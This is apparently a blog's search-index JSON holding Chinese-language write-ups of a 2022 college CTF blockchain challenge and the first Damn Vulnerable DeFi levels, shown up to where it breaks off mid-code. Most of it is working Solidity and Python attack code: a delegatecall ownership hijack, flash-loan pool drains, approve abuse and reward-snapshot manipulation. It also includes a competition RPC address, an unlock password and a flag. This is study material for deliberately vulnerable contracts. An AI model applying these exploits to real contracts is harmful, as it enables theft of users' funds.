8d3a1d3f2379a4a64c28b383e81b97c85b4f79f37418b430c11a00ca447da423509d1ef301464594e4c731ece979860d6ab6bcaa3fec485e186ae873e90010ebe58e5b2ba22e4c10a45d5fa3a036cbe9c94e751ef83e832360c0cf49835e9e189717955b1a2bd9519c0decbc77d5dd4677e2dc453bbb9ffe0801718fb0684c00ad60310c4057aa06ba598a126a17e6878e4e6577b0c7016aee1140bd0562363d389657c71c6c782068ff35a717790d25708e45622839d202f002e1dae3a51c10e5aaf037f3acb77431ac4181e64aea3b0f05ac669436810ec03019e21ca2c5908e71f931880b7f1d65a32a5ad23210315030a98fd3b5c1eb7bbf9a2e9d30ff6f0c0722716a4c120014b9d16d955e0729a1d27ea9f6320d62c6ce5d8f830946c02be7bc11bde115eb37713d09fdfe7eb1885adff9db63e8dad3f26b201e1c3dfcddf835e877d182a4f3ed53aaa2862d9c41128247551305802449ff96a428f378ae81edf6f003b63b35e4482df94fa8ec6fe82bfac6853c4889fab7bea3fc9f08390abf5ba920de77b1861d80329bb3e4f7e56a58de40a807a17a9cf98b93c4995d37f822b4cad63dfb2ac90d367fefcd4b02cd900d85ffa8889d2e0ec955d4bfd87d6e0ebbcb4c7fa5158e24f75fbfa43586a18bb629353dfc9de60ed937246addec9ba590c5938e94e0f394126e59058bc728f2643221fc5c8cd7891fa246d9313ab1edec8d80037190d520fc797fb914c1ada5bb80b9fbb385762296e5f4aee392f86a5e4f37ad1d44668173da8e8ca4914ae13f7596161c965ff1c2bc0bf01cd42b7d807f31a9e744718cbfd44d1d57fec86d7f2bd83e82c7f8447ca9547ebcdb04ee54f3371a2968e863981c786c74992d4db938d67a2f8866b6e51c9516e0493f1abd3a3dc3bbbbbc855fd44438f321bd3e91dbae0963b89e9a1ba9c0f27ab67768e48b4fc2072d6771804485c6f36cd2b89ed71aa53667b010ff1d4a1e48054dd06cd2a4d34601cf9a66acc535380a52db099acc25dd35d101c226c6ef9e0ab120957deef6adf30f0bfc22a4762bc887a111ea5bad6e28318a90c7d967f5090c3c5f4abbb823f15ffbe076c5a86d562f886c033de0f4c78640114c90f22012bad46da5a94907b096249d757f34ee9cec808706b0f938c2ee2c51e16d562632719d1625636d0386d292b6cfbe118f93f371fa7b51c49bcd4a3f8661434e4bfc4cf3282fa8d1a2307a3e880d6a98ff51168cbc8c9a1d67af46900dca0c4d5c383323706681867fa6f6420a2bd141daa87b7ea4cec388503e45d86573136439609fb61b610dfb413e0e877649d44934a510cba347243df411934ad036b93fd5231be1aebeca976d23249b227a3c2c16989f6f8e6cae9ff9b06ae6cd29f536e3d4c68f9ccff2fc45e874ab660f773f23f4d960b533c26dc172aac968a74dfbb21498fe0ff3afe5bc0aa8f7b45f0cfd32087dcccc042b51b6d861c9838e38ef4db38a4a74577e324ecd5e9295bc10d84a137c1cb87e9ee83c59ef528dc2eee8c650e111eee492fb1136555f32e1e3934c0e303556febd211cffbc287ae687e384f6484ab789f5684eef486b0497de75d04517f1b2c71b079221d7150de80955919e5ff8971d8254ec1c0f36a2810be0afa35a0aec61a847f2de3349aa850b6ffa8cc88b551476a454f8b83432125f11b8d8df411e7f3c6b80d47164ca3463a49bc112e7947132307e25892a4fced7736030a490210080838dae3b5694f42498dda9c5a292c4398435792aa583a95b45f117bceb9d5f2cf5458ce727010e1c583cf9fe92c0977516671bd62199679c325dd3adc45cb58785aaec85650ef1e3946182ff33c48f76b6ca292d1b9c186a9d6a004f4dd4f30ed08fa9e1154cad6dc0fa93387c2eea373b33e7224fa57e3ef5a121c790603f49ed1cb7b3089afe0923cabba00944708f44d5d5bcbe9a8a7f0fc06100c8d4d018fbe4ddcadd35f481b5cb15a17297e83f3085293696cf37ade04f09ce77232512f1503f61a3ae9efe70ef0efa40d82900846839fcd62ee2cfdf5f9c9d42fb21f9a5ac4280be4ab41b6918847363f1827485a9778a179c531fe0603f1d00966ff01d85a34fcba463d667eb00a04990c8265538a538a5c0368ecea5c52fc34c240fc17f410576329a1d77353d46989a4558870e8eb7f73f22e0054b988f38647817022250860805b222a8500e1b228e36b6b135e75cdf8fa712e7fc15519074375adf758aca6120f4cfa1f3e53a5f42baf75ec0aa9bc45cc6ec037a3dd6d6c6996ffb51bf902bcfa4fcf62e0e47ac621ee591dc71b4161aa3241b873f47d7e9ac3a50353396a428f7f94bdf0163a12d94cb271f6ed97875449225587c724369170eba5a2a1f1b46a1c7a1744bf5c4ceaf276a94c2ee86e65a5c02ec5926089b1f84d2427eaef5c4b6b69e36741fafac8706247f9b4c4edd2a807eb7a4f4442c1e2f7e7561e50bde24f657f99f9670c27516c891849c24bc4920e1edc9cd9979267da9f2911ddccd825cf7dd33f10fb53c4308880e74535f1b6f168e35bb531d05a8327ba485cb2c21d8a687a9f8cab31bd5fac404ab74172de978ef8f5df0e9cad59fd101d839df6e77807f2c5fa690b0264bcf8b5329bf19878b36727158bc60e7f2acebf847ea22eec35439813e3ed3612c31542f8d2270eade0d5467da8d120e584dc67565d8350fb4fce98632d2c5b45f391150f19ac2ca26bede455f4a768abf5b5da9081ab2e4ac325de8bba6f19e6983b392517151902e0ed0695bae92dff8048aecbd2f6321ea7479dc499ad14cea225120701fef49df67249776ecc2bd21a47bd7f6ce6dc5e5de0f31248a4c786940444b0f861b158c1d0aa72e03e1a5790a4fe57624ebe9d85b5de17cdcf1f08a94321c4b0203feb37f9fec26fff69893257ad69de12104a8627c2bbcc1504039214745721dc817f73d23d9aae2816eabad3e8f8b4a3d11bf0bbc8f018e9838338e94aae259f0a53b10556b804c9c6dba5a0b405bba65397fdf21e5f63c9db452314a0ad819822e4ef8e4d39376a0425a99068173f86c7c7ffa594fde70c7803147b2d22e92b4176c8b97ca8d56e7a4e34360b51efb81055a98cc050ac5ba88bf29df7909f59252c210ddfe5d778c8f5c14744fd45a257b5ec723d5bea2ede929a35ede5f6239e4022c091b1e412c16ff1c7de2df132f21bf590595a21fadf6af2614b307d91d1d3a5535857938e6cf0491b523cbcf797a0c120fb04752e73b2060e6984b26f031961e9565ee2cf0f5d402995bc128a3bfed951b04f4360087b4a6edc55c59b817cafb9fad287fede7b49cc33c3a3e48e14e0eb7dc7d2c545cf32c4153e9921ed863e548883c50363ea054a8535c8695ffef7a05da348822131f88dcab7ab766bb264996111eb6efb3c342dbf8b27a7d7bde7d6b6ac2549f1a047908b568ef05e31e5363f58da50455bb539c4af11e525a7118f2be7f9e289c8867816cb9a13aa4e3ddb83b442eed305137ef2cdb0820ad4033e7d03893ace1a2eaed8fd18cbbe7fb9a83621f7a4023682bb4d3e02470d941094eddc1d7c739310e051d9ebe22973795200dc5a1397e7d0c01617f9aa697487cbf1381733a751965aec18d29bfc3fdc26d50fc2e7974b294673aec721b6a5ad27fea4984f71a926a184a250fe190de32ef2a2fd29050c38f1ad17a8d4378493e3d2b7cb82c99789ef85e37ee80ecb84bc736b9a9d1e62f9401ec\n  \n    \n      \n      \n        Hey, password is required here.\n      \n    \n  \n\n","slug":"BlockSec interview questions","date":"2022-08-02T02:51:50.704Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"7a7dc284a8f031161ea186b2342a420d","title":"The 15th National College Student Information Security Competition","content":" 周日打了一下2022国赛的区块链题目，拿出来分享一下\n\n\n1.Codepragma solidity ^0.4.26;\n\ncontract Lib &#123;\n    uint public score;\n\n    function setScore(uint _score) public &#123;\n        score = _score;\n    &#125;\n&#125;\n pragma solidity ^0.4.26;\n\ncontract HackMe &#123;\n    address public lib;\n    address public owner;\n    uint public score;\n\n    constructor(address _lib) public payable&#123;\n        lib = _lib;\n        owner = msg.sender;\n    &#125;\n\n    function setScore(uint _score) public &#123;\n        (bool res, ) = lib.delegatecall(abi.encodeWithSignature(\"setScore(uint256)\", _score));\n        require(res, \"Failed to delegatecall to lib\");\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n\n题目要求：owner值发生改变即可\nAnalyze漏洞是比较基础的delegatecall漏洞，就是调用外部代码，执行环境却是在本合约，详情参考我之前写过的基础漏洞汇总，链接：https://bcyng-w.github.io/2022/04/10/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#more\n调用两次setscore，第一次将lib转变为攻击合约，第二次调用攻击合约下的setscore修改对应slot1的值即可改变Hackme下owner的值。\n该题解锁钱包的方式比较特别，随机生成的账户没有私钥，而是用生成账户时的密码进行解锁账户，参考：https://blog.csdn.net/qq_41907714/article/details/106640274\n\n我在这里设置的密码是123\n使用的解锁方法\nw3.geth.personal.unlockAccount('0x0D7c2FB2B185e6633FC027eE2A37138661934026','123')\n\nAttack最后附上攻击脚本\nfrom web3 import Web3,HTTPProvider\nfrom time import sleep\nw3=Web3(HTTPProvider('http://47.104.106.8:8545'))\nhacksabi='''\n[\n\t&#123;\n\t\t\"constant\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"_score\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"setScore\",\n\t\t\"outputs\": [],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"_lib\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": true,\n\t\t\"stateMutability\": \"payable\",\n\t\t\"type\": \"constructor\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"lib\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"owner\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"score\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;\n]\n'''\nhackersabi='''\n[\n\t&#123;\n\t\t\"constant\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"_score\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"setScore\",\n\t\t\"outputs\": [],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"score\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"constructor\"\n\t&#125;\n]\n'''\n\nres=w3.geth.personal.unlockAccount('0x0D7c2FB2B185e6633FC027eE2A37138661934026','123')\naccount=w3.toChecksumAddress('0x0D7c2FB2B185e6633FC027eE2A37138661934026')\nprint(w3.eth.getBalance(account))\nhachsaddress='0x73d7c98126aaC3e9dd5f4c4957a07fB05f5e8EB2'\nhackscontract=w3.eth.contract(abi=hacksabi,address=hachsaddress)\ncode='608060405234801561001057600080fd5b5060dc8061001f6000396000f3006080604052600436106049576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063422beeba14604e578063efedc669146078575b600080fd5b348015605957600080fd5b5060766004803603810190808035906020019092919050505060a0565b005b348015608357600080fd5b50608a60aa565b6040518082815260200191505060405180910390f35b8060018190555050565b600154815600a165627a7a72305820282edb4b675a8fb6d0eb1ab79325fc438b3ae4f8c9b27a3ad1690ef7704b531e0029'\nhackerscontract=w3.eth.contract(abi=hackersabi,bytecode=code)\n# constructor_txn=hackerscontract.constructor().buildTransaction(&#123;\n#     'from': account,\n#     'gas': 1000000\n#     &#125;)\n\n# tx_id=w3.eth.sendTransaction(constructor_txn)\n# print(tx_id.hex())\n# sleep(5)\n# a=w3.eth.getTransactionReceipt(tx_id).contractAddress\n# sleep(5)\n# print(a)\nstep1_txn=hackscontract.functions.setScore(0xBD6Ab56B2C74BDD3aBcf197af0Ff9e08F7F41a2D).buildTransaction(&#123;\n    'from':account,\n    'gas': 1000000\n    &#125;)\ntx_id1=w3.eth.sendTransaction(step1_txn)\nprint(tx_id1)\nsleep(5)\nstep2_txn=hackscontract.functions.setScore(0x03C6FcED478cBbC9a4FAB34eF9f40767739D1Ff7).buildTransaction(&#123;\n    'from':account,\n    'gas': 1000000\n    &#125;)\ntx_id2=w3.eth.sendTransaction(step2_txn)\nprint(tx_id2)\n\n\n代码分段运行，先注释掉攻击部份，部署攻击合约，获得合约地址后作为攻击脚本的参数进行攻击，运行结束后，再cmd终端输入4检查攻击是否成功。\n获得flag：flag:{23d1eb0e-e1f5-4a86-b722-690135f0377a}\n","slug":"The 15th National College Student Information Security Competition","date":"2022-08-02T02:49:40.287Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"3e4e5e9b128bda97a530bf234e940a7f","title":"Damn Vulnerable Defi","content":"地址：https://www.damnvulnerabledefi.xyz/\n1.Unstoppable\n\n\n\n\n\n\n\n\n题目要求：\nThere’s a lending pool with a million DVT tokens in balance, offering flash loans for free.\nIf only there was a way to attack and stop the pool from offering flash loans …\nYou start with 100 DVT tokens in balance.\ncode// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\ninterface IReceiver &#123;\n    function receiveTokens(address tokenAddress, uint256 amount) external;\n&#125;\n\n/**\n * @title UnstoppableLender\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract UnstoppableLender is ReentrancyGuard &#123;\n\n    IERC20 public immutable damnValuableToken;\n    uint256 public poolBalance;\n\n    constructor(address tokenAddress) &#123;\n        require(tokenAddress != address(0), \"Token address cannot be zero\");\n        damnValuableToken = IERC20(tokenAddress);\n    &#125;\n\n    function depositTokens(uint256 amount) external nonReentrant &#123;\n        require(amount > 0, \"Must deposit at least one token\");\n        // Transfer token from sender. Sender must have first approved them.\n        damnValuableToken.transferFrom(msg.sender, address(this), amount);\n        poolBalance = poolBalance + amount;\n    &#125;\n\n    function flashLoan(uint256 borrowAmount) external nonReentrant &#123;\n        require(borrowAmount > 0, \"Must borrow at least one token\");\n\n        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));\n        require(balanceBefore >= borrowAmount, \"Not enough tokens in pool\");\n\n        // Ensured by the protocol via the `depositTokens` function\n        assert(poolBalance == balanceBefore);\n        \n        damnValuableToken.transfer(msg.sender, borrowAmount);\n        \n        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);\n        \n        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flash loan hasn't been paid back\");\n    &#125;\n&#125;\n\nanalyze题目要求攻击合约，使池子不再提供贷款功能，分析合约 ，poolBalance只能在epositTokens()函数被触发时增加，而flashLoan()函数下assert(poolBalance &#x3D;&#x3D; balanceBefore)，意味着如果向合约转账一定的token，balanceBefore会增加但是poolBalance不会增加，从而使assert得不到满足，攻击即可达到要求。\nattackawait this.token.connect(attacker).transfer(this.pool.address,INITIAL_ATTACKER_TOKEN_BALANCE);\n\n2.Naive receiver\n\n\n\n\n\n\n\n\n题目要求：There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.\nYou also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.\nDrain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;)\nFlashLoanReceiver  code// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n\n/**\n * @title FlashLoanReceiver\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract FlashLoanReceiver &#123;\n    using Address for address payable;\n\n    address payable private pool;\n\n    constructor(address payable poolAddress) &#123;\n        pool = poolAddress;\n    &#125;\n\n    // Function called by the pool during flash loan\n    function receiveEther(uint256 fee) public payable &#123;\n        require(msg.sender == pool, \"Sender must be pool\");\n\n        uint256 amountToBeRepaid = msg.value + fee;\n\n        require(address(this).balance >= amountToBeRepaid, \"Cannot borrow that much\");\n        \n        _executeActionDuringFlashLoan();\n        \n        // Return funds to pool\n        pool.sendValue(amountToBeRepaid);\n    &#125;\n\n    // Internal function where the funds received are used\n    function _executeActionDuringFlashLoan() internal &#123; &#125;\n\n    // Allow deposits of ETH\n    receive () external payable &#123;&#125;\n&#125;\n\nNaiveReceiverLenderPool  code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n\n/**\n * @title NaiveReceiverLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract NaiveReceiverLenderPool is ReentrancyGuard &#123;\n\n    using Address for address;\n\n    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan\n\n    function fixedFee() external pure returns (uint256) &#123;\n        return FIXED_FEE;\n    &#125;\n\n    function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant &#123;\n\n        uint256 balanceBefore = address(this).balance;\n        require(balanceBefore >= borrowAmount, \"Not enough ETH in pool\");\n\n\n        require(borrower.isContract(), \"Borrower must be a deployed contract\");\n        // Transfer ETH and handle control to receiver\n        borrower.functionCallWithValue(\n            abi.encodeWithSignature(\n                \"receiveEther(uint256)\",\n                FIXED_FEE\n            ),\n            borrowAmount\n        );\n        \n        require(\n            address(this).balance >= balanceBefore + FIXED_FEE,\n            \"Flash loan hasn't been paid back\"\n        );\n    &#125;\n\n    // Allow deposits of ETH\n    receive () external payable &#123;&#125;\n&#125;\n\nanalyze题目要求再一笔交易中将user的10eth全部耗尽，user合约中唯一有转出eth的地方就是receiveEther()函数。\n审计之后我们不难发现一次转出fee*1wei的余额，即每次转出1eth。\n虽然receiveEther()函数中require(address(this).balance &gt;&#x3D; amountToBeRepaid)但是随着函数调用，将会有msg.value的余额转入，所以只需要合约之前的余额大于fee即可，而合约中本来有10eth，所以再balance(this)清零前require总能被满足。\n综上所述，在攻击合约中，for循环调用10次flashLoan()函数即可。\nattackattackcontract\nimport \"E:\\school\\BLOCKCHAIN\\Damn Vulnerable DeFi\\damn-vulnerable-defi-2.0.0\\damn-vulnerable-defi-2.0.0\\contracts\\naive-receiver\\NaiveReceiverLenderPool.sol\";\ncontract AttackNaiveReceiver &#123;\n    NaiveReceiverLenderPool target;\n\n    constructor(address payable pool) &#123;\n        target = NaiveReceiverLenderPool(pool);\n    &#125;\n\n    function attack(address tar) public &#123;\n        for (int i=0; i &lt; 10; i++ ) &#123;\n            target.flashLoan(tar, 1 ether);\n        &#125;\n    &#125;\n    \n&#125;\n\n\n\nconst AttackFactory = await ethers.getContractFactory(\"AttackNaiveReceiver\", attacker);\n            const attackContract = await AttackFactory.deploy(this.pool.address);\n            await attackContract.attack(this.receiver.address);\n\n3.Truster\n\n\n\n\n\n\n\n\n题目要求：\nMore and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.\nCurrently the pool has 1 million DVT tokens in balance. And you have nothing.\nBut don’t worry, you might be able to take them all from the pool. In a single transaction.\ncode// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\n/**\n * @title TrusterLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract TrusterLenderPool is ReentrancyGuard &#123;\n\n    using Address for address;\n\n    IERC20 public immutable damnValuableToken;\n\n    constructor (address tokenAddress) &#123;\n        damnValuableToken = IERC20(tokenAddress);\n    &#125;\n\n    function flashLoan(\n        uint256 borrowAmount,\n        address borrower,\n        address target,\n        bytes calldata data\n    )\n        external\n        nonReentrant\n    &#123;\n        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));\n        require(balanceBefore >= borrowAmount, \"Not enough tokens in pool\");\n        \n        damnValuableToken.transfer(borrower, borrowAmount);\n        target.functionCall(data);\n\n        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flash loan hasn't been paid back\");\n    &#125;\n\n&#125;\n\nanalyze这道题和我之前做过的一道ctf的一种解法有些类似，vnctf公开赛的vnloan题目，总的来说就是call调用灵活性极高并且伴随着较高的危险性。\n比如这道题我们可以构造调用approve的data，target地址为token地址，abi编码approve(attacker,1millon)作为data，调用flashLoan()借0token，等待交易完成之后我们即可获得合约的approve，直接transferfrom即可取走全部token\nattackattackcontract\nimport \"./@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract TrusterLenderPool1&#123;\n    function flashLoan(\n        uint256 borrowAmount,\n        address borrower,\n        address target,\n        bytes calldata data\n    )\n        external\n    &#123;\n    &#125;\n&#125;\ncontract TrusterAttacker &#123;\n\n    IERC20 public immutable damnValuableToken;\n    TrusterLenderPool1 private immutable pool;\n\n    constructor (address tokenAddress, address poolAddress) &#123;\n        damnValuableToken = IERC20(tokenAddress);\n        pool = TrusterLenderPool1(poolAddress);\n    &#125;\n\n    function attack(uint256 amount, address attacker) external &#123;\n        pool.flashLoan(0, attacker, address(damnValuableToken), abi.encodeWithSignature(\"approve(address,uint256)\", attacker, amount));\n    &#125;\n\n    receive () external payable &#123;&#125;\n&#125;\n\n\n\n\n\nconst AttackerContractFactory = await ethers.getContractFactory('TrusterAttacker', attacker);\n        const attackerContract = await AttackerContractFactory.deploy(this.token.address, this.pool.address);\n\n        await attackerContract.connect(attacker).attack(TOKENS_IN_POOL, attacker.address);\n        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)\n\n4.Side entrance\n\n\n\n\n\n\n\n\n题目要求：\nA surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.\nThis very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.\nYou must take all ETH from the lending pool.\ncode// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n\ninterface IFlashLoanEtherReceiver &#123;\n    function execute() external payable;\n&#125;\n\n/**\n * @title SideEntranceLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract SideEntranceLenderPool &#123;\n    using Address for address payable;\n\n    mapping (address => uint256) private balances;\n\n    function deposit() external payable &#123;\n        balances[msg.sender] += msg.value;\n    &#125;\n\n    function withdraw() external &#123;\n        uint256 amountToWithdraw = balances[msg.sender];\n        balances[msg.sender] = 0;\n        payable(msg.sender).sendValue(amountToWithdraw);\n    &#125;\n\n    function flashLoan(uint256 amount) external &#123;\n        uint256 balanceBefore = address(this).balance;\n        require(balanceBefore >= amount, \"Not enough ETH in balance\");\n        \n        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();\n\n        require(address(this).balance >= balanceBefore, \"Flash loan hasn't been paid back\");        \n    &#125;\n&#125;\n \n\nanalyze合约本来设有1000eth，我们要将1000eth全部取出，合约提供存取功能。在flashloan()函数总调用了接收合约的execute()函数，所以我们可以构造execute进行攻击。\n闪电贷1000eth，在将1000eth通过deposit()函数存入合约，此时require(address(this).balance &gt;&#x3D; balanceBefore)判断条件将会通过斌并且balances[attacker]也达到了1000eth。\n直接调用withdraw()函数即可。\nattackattack contract\n\ncontract SideEntranceLenderPool1&#123;\n    function flashLoan(uint256) public&#123;&#125;\n    function withdraw() public &#123;&#125;\n    function deposit() public payable&#123;&#125;\n&#125;\ncontract SideEntranceAttacker &#123;\n\n    SideEntranceLenderPool1 private immutable pool;\n    address payable attacker;\n\n    constructor (address poolAddress, address attackerAddress) &#123;\n        pool = SideEntranceLenderPool1(poolAddress);\n        attacker = payable(attackerAddress);\n    &#125;\n\n    function attack(uint256 amount) external &#123;\n        pool.flashLoan(amount);\n        pool.withdraw();\n    &#125;\n\n    function execute() external payable&#123;\n        pool.deposit&#123;value: msg.value&#125;();\n    &#125;\n\n    receive () external payable &#123;\n        attacker.transfer(msg.value);\n    &#125;\n&#125;\n\n\n\nconst SideEntranceAttackerFactory = await ethers.getContractFactory('SideEntranceAttacker', deployer);\n        const attackerContract = await SideEntranceAttackerFactory.deploy(this.pool.address, attacker.address);\n        await attackerContract.connect(attacker).attack(ETHER_IN_POOL)\n\n\n\n5.The rewarder\n\n\n\n\n\n\n\n\n题目要求：\nThere’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.\nAlice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!\nYou don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.\nOh, by the way, rumours say a new pool has just landed on mainnet. Isn’t it offering DVT tokens in flash loans?\ncode// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./RewardToken.sol\";\nimport \"../DamnValuableToken.sol\";\nimport \"./AccountingToken.sol\";\n\n/**\n * @title TheRewarderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract TheRewarderPool &#123;\n\n    // Minimum duration of each round of rewards in seconds\n    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;\n\n    uint256 public lastSnapshotIdForRewards;\n    uint256 public lastRecordedSnapshotTimestamp;\n\n    mapping(address => uint256) public lastRewardTimestamps;\n\n    // Token deposited into the pool by users\n    DamnValuableToken public immutable liquidityToken;\n\n    // Token used for internal accounting and snapshots\n    // Pegged 1:1 with the liquidity token\n    AccountingToken public accToken;\n    \n    // Token in which rewards are issued\n    RewardToken public immutable rewardToken;\n\n    // Track number of rounds\n    uint256 public roundNumber;\n\n    constructor(address tokenAddress) &#123;\n        // Assuming all three tokens have 18 decimals\n        liquidityToken = DamnValuableToken(tokenAddress);\n        accToken = new AccountingToken();\n        rewardToken = new RewardToken();\n\n        _recordSnapshot();\n    &#125;\n\n    /**\n     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance\n     */\n    function deposit(uint256 amountToDeposit) external &#123;\n        require(amountToDeposit > 0, \"Must deposit tokens\");\n        \n        accToken.mint(msg.sender, amountToDeposit);\n        distributeRewards();\n\n        require(\n            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)\n        );\n    &#125;\n\n    function withdraw(uint256 amountToWithdraw) external &#123;\n        accToken.burn(msg.sender, amountToWithdraw);\n        require(liquidityToken.transfer(msg.sender, amountToWithdraw));\n    &#125;\n\n    function distributeRewards() public returns (uint256) &#123;\n        uint256 rewards = 0;\n\n        if(isNewRewardsRound()) &#123;\n            _recordSnapshot();\n        &#125;        \n        \n        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);\n        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);\n\n        if (amountDeposited > 0 &amp;&amp; totalDeposits > 0) &#123;\n            rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;\n\n            if(rewards > 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123;\n                rewardToken.mint(msg.sender, rewards);\n                lastRewardTimestamps[msg.sender] = block.timestamp;\n            &#125;\n        &#125;\n\n        return rewards;     \n    &#125;\n\n    function _recordSnapshot() private &#123;\n        lastSnapshotIdForRewards = accToken.snapshot();\n        lastRecordedSnapshotTimestamp = block.timestamp;\n        roundNumber++;\n    &#125;\n\n    function _hasRetrievedReward(address account) private view returns (bool) &#123;\n        return (\n            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &amp;&amp;\n            lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION\n        );\n    &#125;\n\n    function isNewRewardsRound() public view returns (bool) &#123;\n        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;\n    &#125;\n&#125;\n\nanalyze题目提供闪电贷功能，借出合约全部的钱再deposit()即可设置reward金额。\n进行deposit后会立即计算并且分配奖励。\n再withdraw转回满足flashloan()中的require条件。\nattackattackcontract\n\ninterface DamnValuableToken1&#123;\n    function approve(address,uint)external;\n    function transfer(address,uint)external;\n&#125;\ninterface FlashLoanerPool1&#123;\n    function flashLoan(uint) external;\n&#125;\ninterface TheRewarderPool1&#123;\n    function deposit(uint) external;\n    function withdraw(uint) external;\n&#125;\ninterface RewardToken1&#123;\n    function transfer(address,uint)external;\n    function balanceOf(address)external returns(uint);\n&#125;\ncontract RewarderAttacker &#123;\n\n    DamnValuableToken1 public immutable 